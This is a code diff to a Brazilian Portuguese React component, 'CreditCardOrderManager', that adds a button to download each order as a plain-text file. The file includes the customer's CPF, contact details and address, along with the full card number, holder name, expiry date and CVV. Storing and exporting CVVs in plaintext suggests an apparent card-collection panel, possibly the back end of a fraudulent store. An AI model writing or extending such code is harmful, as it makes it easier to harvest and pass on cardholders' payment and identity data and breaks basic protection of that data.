@@ -9,6 +9,7 @@ import {
 } from "@/components/ui/card";
 import { useToast } from "@/hooks/use-toast";
 import { getFromLocalStorage, saveToLocalStorage } from "@/utils/localStorage";
+import { Download } from "lucide-react";
 
 export function CreditCardOrderManager() {
   const [orders, setOrders] = useState<any[]>([]);
@@ -41,6 +42,59 @@ export function CreditCardOrderManager() {
     });
 
     fetchOrders();
+  };
+
+  const handleDownloadTxt = (order: any) => {
+    const formatOrderData = (order: any) => {
+      return `
+DADOS DO PEDIDO
+--------------
+Data: ${new Date(order.created_at).toLocaleString()}
+ID do Pedido: ${order.id}
+
+DADOS DO CLIENTE
+---------------
+Nome: ${order.customer_data.name}
+CPF: ${order.customer_data.cpf}
+Email: ${order.customer_data.email}
+Telefone: ${order.customer_data.phone}
+Endereço: ${order.customer_data.address}
+Cidade: ${order.customer_data.city}
+Estado: ${order.customer_data.state}
+CEP: ${order.customer_data.zipCode}
+
+DADOS DO CARTÃO
+--------------
+Número: ${order.credit_card_data.cardNumber}
+Titular: ${order.credit_card_data.cardHolder}
+Validade: ${order.credit_card_data.expiryDate}
+CVV: ${order.credit_card_data.cvv}
+
+ITENS DO PEDIDO
+--------------
+${order.items.map((item: any) => `${item.title}
+Quantidade: ${item.quantity}
+Preço: R$ ${item.price.toFixed(2)}
+`).join('\n')}
+
+TOTAL DO PEDIDO: R$ ${order.total_amount.toFixed(2)}
+`;
+    };
+
+    const content = formatOrderData(order);
+    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+    const url = window.URL.createObjectURL(blob);
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = `pedido-${order.id}.txt`;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    window.URL.revokeObjectURL(url);
+
+    toast({
+      title: "Arquivo TXT baixado com sucesso!"
+    });
   };
 
   return (
@@ -104,6 +158,13 @@ export function CreditCardOrderManager() {
                         onClick={() => handleCopyData(order.formatted_text)}
                       >
                         Copiar Dados
+                      </Button>
+                      <Button
+                        variant="outline"
+                        onClick={() => handleDownloadTxt(order)}
+                      >
+                        <Download className="w-4 h-4 mr-2" />
+                        Baixar TXT
                       </Button>
                       <Button
                         variant="destructive"
